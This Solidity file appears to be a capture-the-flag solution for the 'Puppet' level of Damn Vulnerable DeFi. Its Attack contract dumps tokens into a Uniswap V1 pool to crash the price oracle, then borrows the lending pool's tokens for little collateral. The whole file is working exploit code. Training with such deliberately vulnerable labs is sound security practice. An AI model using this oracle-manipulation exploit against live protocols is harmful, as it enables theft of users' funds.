// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract Attack {

    DamnValuableToken damnValuableToken;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;

    constructor (
        DamnValuableToken _damnValuableToken,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery
    ) payable
    {
        damnValuableToken = _damnValuableToken;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }
    
    function attack(uint exploitAmount) public {
        uint dvtBalance = damnValuableToken.balanceOf(address(this));
        damnValuableToken.approve(address(uniswapV1Exchange), dvtBalance);
        console.log("before calculateDepositRequired(amount)", lendingPool.calculateDepositRequired(exploitAmount));
        uniswapV1Exchange.tokenToEthTransferInput(dvtBalance, 1, block.timestamp, address(this));
        console.log("after calculateDepositRequired(amount)", lendingPool.calculateDepositRequired(exploitAmount));
        lendingPool.borrow{value: 20e18}(exploitAmount, recovery);

    }

    receive() external payable {

    }








}